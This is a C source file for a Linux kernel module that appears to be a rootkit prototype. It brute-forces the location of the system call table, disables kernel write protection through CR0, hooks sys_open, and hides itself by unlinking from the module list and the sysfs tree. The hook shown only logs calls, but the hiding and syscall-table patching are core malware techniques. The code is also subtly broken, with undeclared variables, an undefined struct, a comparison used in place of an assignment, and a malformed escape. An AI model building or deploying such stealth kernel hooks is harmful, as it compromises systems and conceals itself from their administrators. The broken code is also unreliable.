#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <asm/pgtable.h>
#include <linux/slab.h>
#include <linux/syscalls.h>

unsigned long cr0;
static unsigned long *sys_call_table;
typedef asmlinkage long (*orig_open_t)(const char *, int, mode_t);
orig_open_t orig_open;

#define START_MEM PAGE_OFFSET
#define END_MEM ULONG_MAX

static struct list_head *mod_prev;

static void module_hide(void){
    struct kernfs_node *node = mod->mkobj.kobj.sd;
    struct module_node *mod_node;

    mod_node = kmalloc(sizeof(struct module_node), GFP_KERNEL);

    mod_node->mod = &THIS_MODULE;
    mod_node->mod_next = &THIS_MODULE->list.next;

    list_del(&THIS_MODULE->list);
    rb_erase(&node->rb, &node->parent->dir.children);
    node->rb.__rb_parent_color == (unsigned long)(&node->rb);
}

unsigned long *
get_syscall_table_bf(void) {
    unsigned long *syscall_table;
    unsigned long int i;

    for(i=START_MEM; i<END_MEM; i+=sizeof(void *)){
        syscall_table = (unsigned long *)i;

        if (syscall_table[__NR_close] == (unsigned long)sys_close)
            return syscall_table;
    }
    return NULL;
}

/* sys_open hook */
asmlinkage static int
hacked_open(const char __user *pathname, int flags, mode_t mode){
    printk(KERN_INFO "sys_open() hook!n");
    return orig_open(pathname, flags, mode);
}

static int __init
syshook_init(void) {
    sys_call_table = (unsigned long *)get_syscall_table_bf();
    cr0 = read_cr0();

    printk("module h4ck3r initiado");
    module_hide();
    if(sys_call_table == NULL){
        printk(KERN_INFO "sys_call_table not fount");
        return -1;
    }

    orig_open = (orig_open_t)sys_call_table[__NR_open];

    write_cr0(cr0 & ~0x00010000);
    sys_call_table[__NR_open] = (unsigned long)hacked_open;
    write_cr0(cr0);

    return 0;
}

static void __exit
syshook_cleanup(void){
    if(orig_open){
        write_cr0(cr0 & ~0x00010000);
        sys_call_table[__NR_open] = (unsigned long)orig_open;
        write_cr0(cr0);
    }

}

module_init(syshook_init);
module_exit(syshook_cleanup);
